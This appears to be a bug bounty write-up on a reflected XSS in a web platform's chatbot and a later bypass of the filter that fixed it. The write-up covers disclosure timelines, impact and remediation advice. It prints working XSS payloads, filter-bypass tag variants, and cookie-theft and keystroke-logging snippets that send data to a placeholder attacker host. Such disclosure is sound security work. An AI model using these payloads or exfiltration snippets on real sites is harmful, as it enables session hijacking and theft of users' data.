# Exploiting and Bypassing XSS Protections in a Chatbot

Cross-Site Scripting (XSS) vulnerabilities remain one of the most persistent and dangerous security flaws in web applications. During a bug bounty program, I identified and reported a **Reflected XSS vulnerability** in a chatbot feature of a web platform. The issue was promptly addressed by the development team, but further testing revealed a bypass for their newly implemented XSS filtering mechanism. Below, I will outline both the initial vulnerability and how the bypass was achieved, along with technical insights and recommendations.

---

## Initial Discovery: Reflected XSS in the Chatbot

The chatbot functionality, designed to assist users in navigating the platform, exhibited a flaw that allowed malicious JavaScript injection. This vulnerability enabled the execution of arbitrary scripts in the context of the user's browser.

### Steps to Identify the Issue

1. **Accessing the Chatbot**:

   - The chatbot was embedded on the registration confirmation page and accessible from the bottom-right corner of the screen.

2. **Injecting the Payload**:

   - Using the chatbot's input field, I injected the following payload:
     ````html
     <script><img title="</script><img src onerror=alert(1)>"></script>
     <title><title><img title="</title><img src onerror=alert(1)>"></title></title>
     <noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>
     <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
         ```
     ````
   - The script executed successfully, triggering an alert in the browser.

3. **Advanced Payload Demonstrations**:
   - To demonstrate the severity of the issue, more harmful payloads were tested, including:
     - **Cookie Theft**:
       ```javascript
       var img = new Image();
       img.src = "http://attackersite.com/cookie?c=" + document.cookie;
       ```
     - **Keystroke Logging**:
       ```javascript
       document.onkeypress = function (e) {
         var xhr = new XMLHttpRequest();
         xhr.open("GET", "http://attackersite.com/log?key=" + e.key, true);
         xhr.send();
       };
       ```

### Root Cause

The chatbot's input validation and output rendering failed to sanitize user-provided inputs, allowing HTML and JavaScript injection.

### Reported Timeline

- **Discovery Date:** October 30, 2024
- **Report Submission:** October 30, 2024
- **Triaging Completed:** November 1, 2024
- **Fix Deployed:** November 5, 2024
- **Acknowledgment:** Public thank-you note.

---

## Developer Response: Implementing XSS Filtering

The development team addressed the vulnerability by deploying a stricter input validation mechanism for the chatbot. The implemented filter blocked commonly used XSS payloads, including those containing `<script>` tags or onerror events.

### Tested Filtered Payloads

```html
     <script><img title="</script><img src onerror=alert(1)>"></script>
     <title><title><img title="</title><img src onerror=alert(1)>"></title></title>
     <noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>
     <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
```

- This payload, designed to trigger an alert using the `onerror` attribute of an image tag, was correctly blocked by the new filter.

While the fix demonstrated a significant improvement, I identified limitations in the filtering logic through further testing.

---

## The Bypass: Exploiting Weaknesses in the XSS Filter

By examining the filtering mechanism, I discovered that it relied heavily on blacklisting specific HTML tags and attributes. This approach left the system vulnerable to less conventional XSS payloads. I developed alternative injection techniques to bypass the protections.

### Bypass Payloads

1. **Tag Alteration**:

   - Introducing unconventional syntax to escape the filter:
     ```html
     <title><title><img title="</title><img src onerror=alert(1)>"></title></title>
     <iframe><iframe><img title="</iframe><img src onerror=alert(1)>"></iframe></iframe>
     <video controls src=<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>>
     ```
   - The browser interpreted this unconventional tag syntax correctly, allowing the execution of the malicious script.

### Technical Analysis

- The bypass succeeded because the filter failed to account for non-standard syntax and relied on simple string matching to block known malicious patterns.
- The chatbot's rendering engine still processed and executed these malformed tags, highlighting a deeper issue in how the platform interpreted user inputs.

### Reported Timeline

- **Discovery Date of Bypass:** November 25, 2024
- **Report Submission:** November 25, 2024
- **Triaging Completed:** November 26, 2024
- **Fix Deployed:** November 29, 2024
- **Acknowledgment:** Private recognition and thank-you note.

---

## Business Impact

1. **Data Theft**:

   - Reflected XSS vulnerabilities enable attackers to steal sensitive user data, including session tokens and cookies.

2. **Session Hijacking**:

   - Stolen session tokens can be used to impersonate users, escalating privileges if the compromised account belongs to an administrator.

3. **Malicious Actions**:

   - Arbitrary scripts can send unauthorized requests on behalf of the user, modify account settings, or disrupt services.

4. **Reputation Damage**:
   - Exploitation of vulnerabilities on public-facing platforms, especially government or enterprise systems, erodes user trust and damages the platform's reputation.

---

## Recommendations

1. **Input Sanitization**:

   - Strictly sanitize all inputs on both client and server sides to remove or encode special characters such as `<`, `>`, and `&`.

2. **Output Encoding**:

   - Encode all user-generated content before rendering it in the browser to ensure that it is treated as plain text rather than executable code.

3. **Content Security Policy (CSP)**:

   - Implement a strong CSP to restrict the execution of scripts to trusted sources. This serves as an additional layer of protection against XSS attacks.

4. **Server-Side Validation**:

   - Validate all user inputs server-side to ensure consistency and prevent tampering.

5. **Fuzz Testing for Filter Bypasses**:

   - Continuously test input validation mechanisms using automated tools and fuzzing techniques to identify bypass methods.

6. **Logging and Monitoring**:
   - Implement robust logging and monitoring to detect anomalous activities, such as repeated injection attempts or suspicious payloads.

---

## Conclusion

The initial reflected XSS vulnerability in the chatbot demonstrated a critical lapse in input sanitization and output encoding. Although the development team implemented a quick fix to address the issue, the reliance on blacklisting and inadequate fuzz testing allowed for a bypass of the new protections. This case highlights the importance of adopting a multi-layered approach to input validation and security.

Addressing XSS vulnerabilities requires a combination of secure development practices, proactive monitoring, and periodic security assessments. By implementing the recommended fixes, the platform can effectively mitigate these risks and safeguard its users from malicious exploitation.
